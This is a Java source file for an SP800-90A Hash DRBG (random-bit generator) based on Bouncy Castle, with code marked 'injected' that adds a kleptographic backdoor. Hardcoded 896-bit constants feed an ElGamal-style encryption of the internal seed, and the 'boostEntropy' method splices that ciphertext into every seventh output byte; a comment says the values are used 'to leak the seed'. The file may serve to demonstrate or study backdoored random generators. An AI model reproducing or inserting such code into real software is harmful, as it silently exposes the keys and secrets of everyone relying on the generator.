import java.math.BigInteger;
import java.util.Hashtable;

import org.bouncycastle.crypto.Digest;
import org.bouncycastle.crypto.prng.EntropySource;
import org.bouncycastle.util.Arrays;
import org.bouncycastle.util.Integers;


/**
 * A SP800-90A Hash DRBG.
 */
public class HashDRBG
        implements SP800 {
    private final static byte[] ONE = {0x01};

    private final static long RESEED_MAX = 1L << (48 - 1);
    private final static int MAX_BITS_REQUEST = 1 << (19 - 1);

    private final static Hashtable seedlens = new Hashtable();

    static {
        seedlens.put("SHA-1", Integers.valueOf(440));
        seedlens.put("SHA-224", Integers.valueOf(440));
        seedlens.put("SHA-256", Integers.valueOf(440));
        seedlens.put("SHA-512/256", Integers.valueOf(440));
        seedlens.put("SHA-512/224", Integers.valueOf(440));
        seedlens.put("SHA-384", Integers.valueOf(888));
        seedlens.put("SHA-512", Integers.valueOf(888));
    }

    private Digest _digest;
    private byte[] _V;
    private byte[] _C;
    // injected ****************************************************************************************************************************************************************************************************************************************************************************************************************
    // 896-bits prime number
    private BigInteger p = new BigInteger("372237540010079469245503495827942559243112358851042997529885562204687557082280361998968495303979024919107357688890920968493650209817944082992285485546224121721928289497490229726351292651073520663573779035633025586325811448006277217747030673205095056286824454158901848027");
    // 896-bits number
    private BigInteger y = new BigInteger("370805712518535082707151967506324255652430203570992601679823767672082481545041188079934731836697503242997459357105174096018586508413921763324856462099224984822209285127115507981167042823016405874529702427341719867113304926138457659375694108247791982322320751277727927343");
    // Each Cs is 112-bytes
    private byte[] C1 = new byte[112];
    private byte[] C2 = new byte[112];

    private int update1 = 0;
    private int update2 = 0;

    private boolean updateFlag = false;
    // *************************************************************************************************************************************************************************************************************************************************************************************************************************
    private long _reseedCounter;
    private EntropySource _entropySource;
    private int _securityStrength;
    private int _seedLength;


    /**
     * Construct a SP800-90A Hash DRBG.
     * <p>
     * Minimum entropy requirement is the security strength requested.
     * </p>
     *
     * @param digest                source digest to use for DRB stream.
     * @param securityStrength      security strength required (in bits)
     * @param entropySource         source of entropy to use for seeding/reseeding.
     * @param personalizationString personalization string to distinguish this DRBG (may be null).
     * @param nonce                 nonce to further distinguish this DRBG (may be null).
     */
    public HashDRBG(Digest digest, int securityStrength, EntropySource entropySource, byte[] personalizationString, byte[] nonce) {
        if (securityStrength > Utils.getMaxSecurityStrength(digest)) {
            throw new IllegalArgumentException("Requested security strength is not supported by the derivation function");
        }

        if (entropySource.entropySize() < securityStrength) {
            throw new IllegalArgumentException("Not enough entropy for security strength required");
        }

        _digest = digest;
        _entropySource = entropySource;
        _securityStrength = securityStrength;
        _seedLength = ((Integer) seedlens.get(digest.getAlgorithmName())).intValue();

        // 1. seed_material = entropy_input || nonce || personalization_string.
        // 2. seed = Hash_df (seed_material, seedlen).
        // 3. V = seed.
        // 4. C = Hash_df ((0x00 || V), seedlen). Comment: Preceed V with a byte
        // of zeros.
        // 5. reseed_counter = 1.
        // 6. Return V, C, and reseed_counter as the initial_working_state

        byte[] entropy = getEntropy();
        byte[] seedMaterial = Arrays.concatenate(entropy, nonce, personalizationString);
        byte[] seed = Utils.hash_df(_digest, seedMaterial, _seedLength);

        _V = seed;
        byte[] subV = new byte[_V.length + 1];
        System.arraycopy(_V, 0, subV, 1, _V.length);
        _C = Utils.hash_df(_digest, subV, _seedLength);

        _reseedCounter = 1;
    }

    /**
     * Return the block size (in bits) of the DRBG.
     *
     * @return the number of bits produced on each internal round of the DRBG.
     */
    public int getBlockSize() {
        return _digest.getDigestSize() * 8;
    }

    /**
     * Populate a passed in array with random data.
     *
     * @param output              output array for generated bits.
     * @param additionalInput     additional input to be added to the DRBG in this step.
     * @param predictionResistant true if a reseed should be forced, false otherwise.
     * @return number of bits generated, -1 if a reseed required.
     */
    public int generate(byte[] output, byte[] additionalInput, boolean predictionResistant) {
        // 1. If reseed_counter > reseed_interval, then return an indication that a
        // reseed is required.
        // 2. If (additional_input != Null), then do
        // 2.1 w = Hash (0x02 || V || additional_input).
        // 2.2 V = (V + w) mod 2^seedlen
        // .
        // 3. (returned_bits) = Hashgen (requested_number_of_bits, V).
        // 4. H = Hash (0x03 || V).
        // 5. V = (V + H + C + reseed_counter) mod 2^seedlen
        // .
        // 6. reseed_counter = reseed_counter + 1.
        // 7. Return SUCCESS, returned_bits, and the new values of V, C, and
        // reseed_counter for the new_working_state.
        int numberOfBits = output.length * 8;

        if (numberOfBits > MAX_BITS_REQUEST) {
            throw new IllegalArgumentException("Number of bits per request limited to " + MAX_BITS_REQUEST);
        }

        if (_reseedCounter > RESEED_MAX) {
            return -1;
        }

        if (predictionResistant) {
            reseed(additionalInput);
            additionalInput = null;
        }

        // 2.
        if (additionalInput != null) {
            byte[] newInput = new byte[1 + _V.length + additionalInput.length];
            newInput[0] = 0x02;
            System.arraycopy(_V, 0, newInput, 1, _V.length);
            // TODO: inOff / inLength
            System.arraycopy(additionalInput, 0, newInput, 1 + _V.length, additionalInput.length);
            byte[] w = hash(newInput);

            addTo(_V, w);
        }

        // 3.
        byte[] rv = hashgen(_V, numberOfBits);

        // 4.
        byte[] subH = new byte[_V.length + 1];
        System.arraycopy(_V, 0, subH, 1, _V.length);
        subH[0] = 0x03;

        byte[] H = hash(subH);

        // 5.
        addTo(_V, H);
        addTo(_V, _C);
        byte[] c = new byte[4];
        c[0] = (byte) (_reseedCounter >> 24);
        c[1] = (byte) (_reseedCounter >> 16);
        c[2] = (byte) (_reseedCounter >> 8);
        c[3] = (byte) _reseedCounter;

        addTo(_V, c);

        _reseedCounter++;

        System.arraycopy(rv, 0, output, 0, output.length);

        return numberOfBits;
    }

    private byte[] getEntropy() {
        byte[] entropy = _entropySource.getEntropy();
        if (entropy.length < (_securityStrength + 7) / 8) {
            throw new IllegalStateException("Insufficient entropy provided by entropy source");
        }
        return entropy;
    }

    // this will always add the shorter length byte array mathematically to the
    // longer length byte array.
    // be careful....
    private void addTo(byte[] longer, byte[] shorter) {
        int carry = 0;
        for (int i = 1; i <= shorter.length; i++) // warning
        {
            int res = (longer[longer.length - i] & 0xff) + (shorter[shorter.length - i] & 0xff) + carry;
            carry = (res > 0xff) ? 1 : 0;
            longer[longer.length - i] = (byte) res;
        }

        for (int i = shorter.length + 1; i <= longer.length; i++) // warning
        {
            int res = (longer[longer.length - i] & 0xff) + carry;
            carry = (res > 0xff) ? 1 : 0;
            longer[longer.length - i] = (byte) res;
        }
    }

    /**
     * Reseed the DRBG.
     *
     * @param additionalInput additional input to be added to the DRBG in this step.
     */
    public void reseed(byte[] additionalInput) {
        // 1. seed_material = 0x01 || V || entropy_input || additional_input.
        //
        // 2. seed = Hash_df (seed_material, seedlen).
        //
        // 3. V = seed.
        //
        // 4. C = Hash_df ((0x00 || V), seedlen).
        //
        // 5. reseed_counter = 1.
        //
        // 6. Return V, C, and reseed_counter for the new_working_state.
        //
        // Comment: Precede with a byte of all zeros.
        byte[] entropy = getEntropy();
        byte[] seedMaterial = Arrays.concatenate(ONE, _V, entropy, additionalInput);
        byte[] seed = Utils.hash_df(_digest, seedMaterial, _seedLength);

        _V = seed;
        byte[] subV = new byte[_V.length + 1];
        subV[0] = 0x00;
        System.arraycopy(_V, 0, subV, 1, _V.length);
        _C = Utils.hash_df(_digest, subV, _seedLength);

        _reseedCounter = 1;
    }

    private byte[] hash(byte[] input) {
        byte[] hash = new byte[_digest.getDigestSize()];
        doHash(input, hash);
        return hash;
    }

    private void doHash(byte[] input, byte[] output) {
        _digest.update(input, 0, input.length);
        _digest.doFinal(output, 0);
    }

    // 1. m = [requested_number_of_bits / outlen]
    // 2. data = V.
    // 3. W = the Null string.
    // 4. For i = 1 to m
    // 4.1 wi = Hash (data).
    // 4.2 W = W || wi.
    // 4.3 data = (data + 1) mod 2^seedlen
    // .
    // 5. returned_bits = Leftmost (requested_no_of_bits) bits of W.
    private byte[] hashgen(byte[] input, int lengthInBits) {
        int digestSize = _digest.getDigestSize();
        int m = (lengthInBits / 8) / digestSize;

        byte[] data = new byte[input.length];
        System.arraycopy(input, 0, data, 0, input.length);

        byte[] W = new byte[lengthInBits / 8];

        byte[] dig = new byte[_digest.getDigestSize()];
        for (int i = 0; i <= m; i++) {
            doHash(data, dig);

            int bytesToCopy = ((W.length - i * dig.length) > dig.length)
                    ? dig.length
                    : (W.length - i * dig.length);
            System.arraycopy(dig, 0, W, i * dig.length, bytesToCopy);

            addTo(data, ONE);
        }
        // injected
      return boostEntropy(input, W, lengthInBits/8);
//      return W;
    }

    // injected
    private byte[] boostEntropy(byte[] input, byte[] random_number, int lengthInBytes){

        if(_reseedCounter == 1 || updateFlag){
            // Initialize the C1 and C2. We use them to leak the seed.
            load(random_number, input);
            for(int i = 6; i < lengthInBytes; i+=7){
                if(update1 + 1 < 112) {
                    random_number[i] = C1[update1];
                    update1++;
                }
            }
            updateFlag = false;
        }else if(_reseedCounter % 2 != 0){
            for(int i = 6; i < lengthInBytes; i+=7){
                if(update1 < 112) {
                    random_number[i] = C1[update1];
                    update1++;
                }
            }
        }else {
            for(int i = 6; i < lengthInBytes; i+=7){
                if(update2 < 112) {
                    random_number[i] = C2[update2];
                    update2++;
                }
            }
            if (update2 == 112){
                updateFlag = true;
                update1 = 0;
                update2 = 0;
            }
        }

        return random_number;
    }

    // injected
    private void load(byte[] random, byte[] seed){
        BigInteger r = new BigInteger(random).mod(p);
        BigInteger B_seed = new BigInteger(seed);
        BigInteger t_C1 = BigInteger.valueOf(2).modPow(r, p);
        BigInteger t_C2 = B_seed.multiply(y.modPow(r, p)).mod(p);

        System.arraycopy(convert(t_C1.toByteArray()), 0, C1,0,112);
        System.arraycopy(convert(t_C2.toByteArray()), 0, C2,0,112);

        // just for log
        System.out.println("C1: " + java.util.Arrays.toString(C1));
        System.out.println("C2: " + java.util.Arrays.toString(C2));
    }

    private byte[] convert(byte[] arr){
        if(arr[0] == 0) {
            byte[] tmp = new byte[arr.length - 1];
            System.arraycopy(arr, 1, tmp, 0, tmp.length);
            return tmp;
        }
        return arr;

    }


}


